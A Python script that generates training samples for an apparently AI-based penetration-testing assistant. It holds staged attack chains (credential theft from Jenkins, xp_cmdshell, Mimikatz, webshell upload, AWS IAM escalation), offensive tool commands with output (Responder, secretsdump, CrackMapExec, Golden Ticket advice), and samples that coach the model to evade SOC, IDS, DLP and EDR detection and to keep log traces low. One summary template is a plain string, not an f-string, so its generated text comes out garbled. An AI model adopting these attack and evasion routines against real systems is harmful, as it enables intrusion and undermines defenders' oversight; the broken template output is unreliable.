#!/usr/bin/env python3
"""
Real-World Pentest Scenario Generator
Creates scenario-based training samples from real engagement patterns
"""

import json
import random
from pathlib import Path

OUTPUT_DIR = Path(__file__).parent.parent / "data" / "generated"
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

# ============================================
# REAL ENGAGEMENT SCENARIOS
# ============================================

def generate_engagement_scenarios():
    """Generate full engagement scenario walkthroughs"""
    samples = []
    
    engagements = [
        {
            "title": "Internal Network Assessment - Financial Services",
            "scope": "Internal network 10.0.0.0/8, No production systems, After hours only",
            "phases": [
                {
                    "phase": "Reconnaissance",
                    "finding": "Discovered Jenkins server (10.0.5.12) with anonymous read access",
                    "reasoning": "Jenkins often contains credentials and build secrets. Anonymous access indicates potential misconfiguration.",
                    "action": "Enumerate Jenkins jobs, look for hardcoded credentials in build configurations",
                    "risk": "LOW",
                    "next": "Extract credentials from Jenkins job configurations"
                },
                {
                    "phase": "Credential Access",
                    "finding": "Found database credentials in Jenkins job config: sa/P@ssw0rd123",
                    "reasoning": "Database service accounts often have elevated privileges. MSSQL 'sa' account is highest privilege.",
                    "action": "Test credentials against MSSQL servers in scope",
                    "risk": "MEDIUM",
                    "next": "Use xp_cmdshell for code execution on DB server"
                },
                {
                    "phase": "Execution",
                    "finding": "MSSQL xp_cmdshell enabled, gained SYSTEM shell on DB server (10.0.2.50)",
                    "reasoning": "Database servers often have access to sensitive data and multiple network segments.",
                    "action": "Extract AD credentials via Mimikatz, enumerate accessible resources",
                    "risk": "MEDIUM",
                    "next": "Use extracted credentials for lateral movement"
                },
                {
                    "phase": "Lateral Movement",
                    "finding": "Service account credentials work on multiple servers",
                    "reasoning": "Service accounts often have broad access for application functionality.",
                    "action": "Map accessible systems, identify domain admin activity",
                    "risk": "MEDIUM",
                    "next": "Target system where domain admin is logged in"
                },
                {
                    "phase": "Privilege Escalation",
                    "finding": "Domain admin session found on file server (10.0.3.25)",
                    "reasoning": "Token impersonation allows escalation without password.",
                    "action": "Use Incognito to impersonate domain admin token",
                    "risk": "HIGH",
                    "next": "Access domain controller with admin privileges"
                }
            ]
        },
        {
            "title": "External Web Application Pentest - E-Commerce",
            "scope": "*.target.com, No denial of service, No customer data exfil",
            "phases": [
                {
                    "phase": "Reconnaissance",
                    "finding": "Discovered admin.target.com with basic auth, staging.target.com with debug mode",
                    "reasoning": "Staging environments often have weaker security and debug info disclosure.",
                    "action": "Test for debug endpoints, error disclosure, default credentials",
                    "risk": "LOW",
                    "next": "Enumerate staging application for vulnerabilities"
                },
                {
                    "phase": "Vulnerability Discovery",
                    "finding": "Staging has SQL injection in search parameter: /search?q=test'",
                    "reasoning": "SQLi can lead to data access, auth bypass, or RCE depending on DB type and privileges.",
                    "action": "Enumerate database type, structure, and current user privileges",
                    "risk": "MEDIUM",
                    "next": "Extract sensitive data or escalate to RCE"
                },
                {
                    "phase": "Exploitation",
                    "finding": "MySQL running as root, FILE privilege available",
                    "reasoning": "FILE privilege allows reading/writing system files, potential for webshell upload.",
                    "action": "Write PHP webshell to web root using INTO OUTFILE",
                    "risk": "HIGH",
                    "next": "Access webshell, establish persistent foothold"
                },
                {
                    "phase": "Post-Exploitation",
                    "finding": "Webshell functional, discovered connection to production database",
                    "reasoning": "Staging-to-production connections are common and often lead to prod compromise.",
                    "action": "Enumerate production database connectivity without extracting customer data",
                    "risk": "MEDIUM",
                    "next": "Document impact and recommend segmentation"
                }
            ]
        },
        {
            "title": "Red Team Assessment - Healthcare Organization",
            "scope": "Full scope authorized, Avoid patient systems, Reporting required for critical findings",
            "phases": [
                {
                    "phase": "Initial Access",
                    "finding": "Spear phishing successful, user clicked link and executed payload",
                    "reasoning": "Healthcare workers are often targeted due to high stress environments and critical nature of work.",
                    "action": "Establish C2 channel, begin internal reconnaissance",
                    "risk": "MEDIUM",
                    "next": "Enumerate AD environment, identify high-value targets"
                },
                {
                    "phase": "Discovery",
                    "finding": "BloodHound reveals path to Domain Admin via IT admin group",
                    "reasoning": "Nested group membership often creates unintended privilege escalation paths.",
                    "action": "Target user in first hop of attack path",
                    "risk": "LOW",
                    "next": "Compromise IT helpdesk user account"
                },
                {
                    "phase": "Credential Access",
                    "finding": "IT helpdesk user reuses password from previously breached site",
                    "reasoning": "Password reuse is common and often bypasses MFA for internal systems.",
                    "action": "Use helpdesk credentials to access IT systems",
                    "risk": "MEDIUM",
                    "next": "Locate Domain Admin credentials in IT management tools"
                },
                {
                    "phase": "Domain Dominance",
                    "finding": "IT management system stores Domain Admin credentials in recoverable format",
                    "reasoning": "Configuration management tools often have excessive credential storage.",
                    "action": "Extract DA credentials, verify with DCSync",
                    "risk": "HIGH",
                    "next": "Document full attack chain, prepare for blue team notification"
                }
            ]
        },
        {
            "title": "Cloud Security Assessment - AWS Environment",
            "scope": "AWS account 123456789012, Non-production resources only",
            "phases": [
                {
                    "phase": "Enumeration",
                    "finding": "Public S3 bucket with CloudFormation templates containing hardcoded secrets",
                    "reasoning": "IaC templates frequently contain sensitive credentials for automation.",
                    "action": "Extract and catalog discovered credentials",
                    "risk": "LOW",
                    "next": "Test extracted credentials for valid access"
                },
                {
                    "phase": "Initial Access",
                    "finding": "AWS access keys valid, attached to IAM user with EC2 and S3 permissions",
                    "reasoning": "Hardcoded keys often have more permissions than needed (privilege creep).",
                    "action": "Enumerate IAM permissions, accessible resources, and potential escalation paths",
                    "risk": "MEDIUM",
                    "next": "Look for privilege escalation via IAM misconfigurations"
                },
                {
                    "phase": "Privilege Escalation",
                    "finding": "User can create IAM roles and EC2 instances, potential for instance profile abuse",
                    "reasoning": "iam:CreateRole + ec2:RunInstances often leads to privilege escalation.",
                    "action": "Create role with admin policy, launch instance with that role",
                    "risk": "HIGH",
                    "next": "Access admin-level resources via new instance profile"
                },
                {
                    "phase": "Impact Assessment",
                    "finding": "Achieved admin access, can access all non-production resources",
                    "reasoning": "Document scope of access for remediation prioritization.",
                    "action": "Enumerate accessible databases, secrets, and cross-account roles",
                    "risk": "HIGH",
                    "next": "Generate findings report with remediation timeline"
                }
            ]
        },
        {
            "title": "Wireless Security Assessment - Corporate Office",
            "scope": "All wireless networks, No jamming, Testing from designated area",
            "phases": [
                {
                    "phase": "Reconnaissance",
                    "finding": "Discovered 4 SSIDs: Corp-WPA2, Guest-Open, IoT-WPA2, Legacy-WEP",
                    "reasoning": "Legacy encryption (WEP) and open networks present easy entry points.",
                    "action": "Capture WEP traffic for cracking, analyze guest network segmentation",
                    "risk": "LOW",
                    "next": "Crack WEP key, test guest-to-corp connectivity"
                },
                {
                    "phase": "Exploitation",
                    "finding": "WEP cracked in 5 minutes (64-bit key), IoT network",
                    "reasoning": "IoT networks often have poor segmentation from corporate networks.",
                    "action": "Connect to IoT network, scan for corporate network access",
                    "risk": "MEDIUM",
                    "next": "Pivot from IoT to corporate network"
                },
                {
                    "phase": "Lateral Movement",
                    "finding": "IoT network has routing to corporate VLAN",
                    "reasoning": "Flat network design allows IoT compromise to threaten corporate assets.",
                    "action": "Perform man-in-the-middle on IoT network to capture credentials",
                    "risk": "MEDIUM",
                    "next": "Use captured credentials for corporate access"
                }
            ]
        }
    ]
    
    for engagement in engagements:
        # Generate sample for each phase
        for i, phase in enumerate(engagement["phases"]):
            context = f"Engagement: {engagement['title']}\nScope: {engagement['scope']}\n"
            if i > 0:
                prev_phase = engagement["phases"][i-1]
                context += f"Previous Phase: {prev_phase['phase']} - {prev_phase['finding']}\n"
            
            output = f"""Phase: {phase["phase"]}

[FINDING]
{phase["finding"]}

[REASONING]
{phase["reasoning"]}

[ACTION]
{phase["action"]}

[RISK LEVEL]
{phase["risk"]}

[NEXT STEPS]
{phase["next"]}

[OPERATIONAL NOTES]
- Maintain stealth by {"operating during normal business hours" if phase["risk"] == "LOW" else "using encrypted C2 channels" if phase["risk"] == "MEDIUM" else "preparing for potential detection response"}
- Document all activities for compliance and reporting
- {"Avoid detection indicators in logs" if phase["risk"] != "LOW" else "Standard operational security applies"}"""
            
            samples.append({
                "instruction": f"You are in the {phase['phase']} phase of a penetration test. Analyze the finding and determine next steps.",
                "input": context + f"Current Finding: {phase['finding']}",
                "output": output.strip()
            })
        
        # Generate full engagement summary
        full_output = f"""Engagement Summary: {engagement["title"]}

[SCOPE]
{engagement["scope"]}

[ATTACK CHAIN]
"""
        for i, phase in enumerate(engagement["phases"]):
            full_output += f"\n{i+1}. {phase['phase']}: {phase['finding']}"
        
        full_output += """

[OVERALL ASSESSMENT]
Attack complexity: {"Low - used common techniques" if any(p["risk"] == "LOW" for p in engagement["phases"]) else "Medium - required chaining multiple vulnerabilities"}
Time to compromise: {"Rapid" if len(engagement["phases"]) <= 3 else "Extended"} engagement
Key weaknesses exploited: """ + ", ".join([p["finding"].split(",")[0] for p in engagement["phases"][:3]])
        
        samples.append({
            "instruction": "Summarize the attack chain for this penetration test engagement.",
            "input": f"Engagement: {engagement['title']}\nScope: {engagement['scope']}",
            "output": full_output.strip()
        })
    
    return samples


def generate_tool_usage_samples():
    """Generate tool-specific usage and interpretation samples"""
    samples = []
    
    tool_scenarios = [
        {
            "tool": "nmap",
            "scenario": "Initial reconnaissance of target network",
            "command": "nmap -sV -sC -p- -oA scan_results 10.0.0.0/24",
            "output_snippet": """
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 7.9p1
80/tcp    open  http          Apache httpd 2.4.38
443/tcp   open  ssl/http      Apache httpd 2.4.38
3306/tcp  open  mysql         MySQL 5.7.28
8080/tcp  open  http-proxy    nginx 1.14.2
""",
            "interpretation": "Multiple services discovered including SSH, web servers, and MySQL. Port 8080 running nginx as reverse proxy suggests application architecture. MySQL exposed directly indicates potential for DB attacks.",
            "next_steps": ["Test MySQL with default credentials", "Enumerate web directories on 80/443/8080", "Check Apache and nginx versions for CVEs"]
        },
        {
            "tool": "gobuster",
            "scenario": "Web directory enumeration",
            "command": "gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirb/common.txt -x php,html",
            "output_snippet": """
/admin                (Status: 301) [Size: 312]
/backup               (Status: 200) [Size: 0]
/config.php           (Status: 200) [Size: 1245]
/uploads              (Status: 301) [Size: 314]
/.htaccess            (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
""",
            "interpretation": "Admin panel discovered, likely login page. /backup directory exists but empty. config.php accessible and returns content - potential information disclosure. /uploads suggests file upload functionality.",
            "next_steps": ["Review config.php for sensitive data", "Attempt admin login with common credentials", "Test file upload for webshell potential"]
        },
        {
            "tool": "BloodHound",
            "scenario": "Active Directory attack path analysis",
            "command": "Import-Module SharpHound.ps1; Invoke-BloodHound -CollectionMethod All",
            "output_snippet": """
Shortest Path to Domain Admins:
USER@DOMAIN.LOCAL (owned) 
-> MemberOf -> IT-Support
-> MemberOf -> Help-Desk-Admin
-> GenericAll -> SVC-BACKUP
-> MemberOf -> Backup-Operators
-> Member -> Administrators (DC)
""",
            "interpretation": "Clear path to Domain Admin via nested group memberships. IT-Support membership leads to Help-Desk-Admin which has GenericAll on SVC-BACKUP service account. Backup-Operators have implicit DC admin rights.",
            "next_steps": ["Compromise IT-Support group member credentials", "Use GenericAll to reset SVC-BACKUP password", "Access DC via Backup Operators privilege"]
        },
        {
            "tool": "sqlmap",
            "scenario": "SQL injection exploitation",
            "command": "sqlmap -u 'http://target.com/search?q=test' --dbs --batch",
            "output_snippet": """
[INFO] the back-end DBMS is MySQL
[INFO] fetching database names
available databases [3]:
[*] information_schema
[*] mysql
[*] webapp_production
""",
            "interpretation": "MySQL backend confirmed. Three databases discovered including webapp_production which likely contains application data. information_schema access means user enumeration possible.",
            "next_steps": ["Enumerate tables in webapp_production", "Look for user/password tables", "Check for file read/write privileges"]
        },
        {
            "tool": "Responder",
            "scenario": "LLMNR/NBT-NS poisoning",
            "command": "responder -I eth0 -wrf",
            "output_snippet": """
[+] Listening for events...
[HTTP] NTLMv2 Client   : 10.0.0.105
[HTTP] NTLMv2 Username : CORP\\jsmith
[HTTP] NTLMv2 Hash     : jsmith::CORP:1234567890abcdef...
[SMB] NTLMv2 Client    : 10.0.0.110  
[SMB] NTLMv2 Username  : CORP\\admin_service
[SMB] NTLMv2 Hash      : admin_service::CORP:abcdef1234...
""",
            "interpretation": "Captured NTLMv2 hashes from two users: jsmith (likely regular user) and admin_service (service account - potentially high value). HTTP and SMB protocols both susceptible.",
            "next_steps": ["Crack captured hashes with hashcat", "If cracking fails, attempt relay attacks", "Target admin_service for higher privilege access"]
        },
        {
            "tool": "Impacket secretsdump",
            "scenario": "Credential extraction from domain controller",
            "command": "secretsdump.py DOMAIN/admin:password@dc01.domain.local",
            "output_snippet": """
[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b21c99fc068e3ab2ca789d14582ad7a2:::
DOMAIN$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
svc_sql:1105:aad3b435b51404eeaad3b435b51404ee:8743b52063cd84097a65d1633f5c74f5:::
""",
            "interpretation": "Domain credential dump successful. KRBTGT hash captured - enables Golden Ticket attacks for persistent domain access. Multiple service account hashes available for lateral movement.",
            "next_steps": ["Create Golden Ticket for persistent access", "Use service account hashes for lateral movement", "Document all compromised accounts for reporting"]
        },
        {
            "tool": "CrackMapExec",
            "scenario": "Mass credential verification across network",
            "command": "crackmapexec smb 10.0.0.0/24 -u admin -p 'Summer2023!' --local-auth",
            "output_snippet": """
SMB  10.0.0.10  445  WORKSTATION1  [*] Windows 10.0 Build 19041 x64
SMB  10.0.0.10  445  WORKSTATION1  [+] WORKSTATION1\\admin:Summer2023! (Pwn3d!)
SMB  10.0.0.15  445  WORKSTATION2  [+] WORKSTATION2\\admin:Summer2023! (Pwn3d!)
SMB  10.0.0.20  445  SERVER1       [+] SERVER1\\admin:Summer2023! (Pwn3d!)
SMB  10.0.0.25  445  DC01          [-] CORP\\admin:Summer2023! STATUS_LOGON_FAILURE
""",
            "interpretation": "Local admin password reuse across multiple workstations and servers. DC uses different credentials (domain auth). Three systems compromised with local admin via password spray.",
            "next_steps": ["Extract additional credentials from compromised systems", "Use compromised servers for further lateral movement", "Document password reuse finding for report"]
        }
    ]
    
    for scenario in tool_scenarios:
        output = f"""Tool Analysis: {scenario["tool"]}

[SCENARIO]
{scenario["scenario"]}

[COMMAND EXECUTED]
```
{scenario["command"]}
```

[OUTPUT ANALYSIS]
```
{scenario["output_snippet"].strip()}
```

[INTERPRETATION]
{scenario["interpretation"]}

[RECOMMENDED NEXT STEPS]
{chr(10).join(f"- {step}" for step in scenario["next_steps"])}

[OPERATIONAL SECURITY]
- {"Output saved for documentation" if "oA" in scenario["command"] or "output" in scenario["command"].lower() else "Consider logging output for report"}
- Review for sensitive data before sharing results
- Cross-reference findings with engagement scope"""
        
        samples.append({
            "instruction": f"Analyze the output from {scenario['tool']} and recommend next steps.",
            "input": f"Tool: {scenario['tool']}\nCommand: {scenario['command']}\nOutput:\n{scenario['output_snippet']}",
            "output": output.strip()
        })
    
    return samples


def generate_defensive_evasion_scenarios():
    """Generate more defensive evasion scenarios"""
    samples = []
    
    scenarios = [
        {
            "defender": "SOC Analyst",
            "alert": "PowerShell execution with encoded command",
            "attacker_technique": "Encoded PowerShell download cradle",
            "detection_bypass": "Use alternative execution methods like mshta, wscript, or bitsadmin",
            "reasoning": "PowerShell monitoring is common, but other LOLBins may be less monitored"
        },
        {
            "defender": "SIEM Correlation",
            "alert": "Multiple failed logins followed by success",
            "attacker_technique": "Password spraying",
            "detection_bypass": "Slow spray rate (1 attempt per account per 30 min), randomize source IPs",
            "reasoning": "Correlation rules typically look for volume and velocity, slow attacks evade thresholds"
        },
        {
            "defender": "Network IDS",
            "alert": "Known C2 traffic pattern detected",
            "attacker_technique": "Cobalt Strike beacon",
            "detection_bypass": "Malleable C2 profile mimicking legitimate traffic, domain fronting",
            "reasoning": "Signature-based detection fails against customized profiles and legitimate CDN traffic"
        },
        {
            "defender": "DLP System",
            "alert": "Sensitive file exfiltration attempt",
            "attacker_technique": "Data extraction over HTTP",
            "detection_bypass": "Encryption before exfil, steganography, chunked transfer, DNS exfil",
            "reasoning": "DLP inspects content, encrypted or encoded data evades content analysis"
        },
        {
            "defender": "Endpoint Detection",
            "alert": "Process injection detected",
            "attacker_technique": "Classic CreateRemoteThread injection",
            "detection_bypass": "Use APC injection, thread hijacking, or module stomping",
            "reasoning": "Modern EDR hooks common injection APIs, alternative methods may evade"
        }
    ]
    
    for s in scenarios:
        output = f"""Defensive Evasion Analysis

[DEFENDER PERSPECTIVE]
Role: {s["defender"]}
Alert: {s["alert"]}

[ATTACKER TECHNIQUE]
Detected: {s["attacker_technique"]}

[EVASION STRATEGY]
Alternative Approach: {s["detection_bypass"]}
Reasoning: {s["reasoning"]}

[RISK ASSESSMENT]
Original technique detection probability: HIGH
Modified technique detection probability: LOW-MEDIUM

[OPERATIONAL RECOMMENDATIONS]
1. Test evasion in controlled environment before live engagement
2. Monitor for secondary detection mechanisms
3. Have fallback techniques ready if evasion fails
4. Document successful evasion for future reference"""
        
        samples.append({
            "instruction": "A security control has detected your technique. Analyze and recommend evasion strategies.",
            "input": f"Detection: {s['alert']}\nYour technique: {s['attacker_technique']}\nDefender: {s['defender']}",
            "output": output.strip()
        })
    
    return samples


def main():
    """Generate all scenario samples"""
    print("🎯 Generating real-world scenario samples...")
    
    all_samples = []
    
    generators = [
        ("engagement_scenarios", generate_engagement_scenarios),
        ("tool_usage", generate_tool_usage_samples),
        ("defensive_evasion", generate_defensive_evasion_scenarios),
    ]
    
    for name, generator in generators:
        print(f"  Generating {name} samples...")
        samples = generator()
        all_samples.extend(samples)
        
        # Save category file
        category_file = OUTPUT_DIR / f"{name}.jsonl"
        with open(category_file, 'w') as f:
            for sample in samples:
                f.write(json.dumps(sample) + '\n')
        print(f"    ✓ {len(samples)} samples saved to {category_file.name}")
    
    # Save combined
    combined_file = OUTPUT_DIR / "scenarios_combined.jsonl"
    with open(combined_file, 'w') as f:
        for sample in all_samples:
            f.write(json.dumps(sample) + '\n')
    
    print(f"\n✅ Total: {len(all_samples)} scenario samples generated")
    return len(all_samples)


if __name__ == "__main__":
    main()
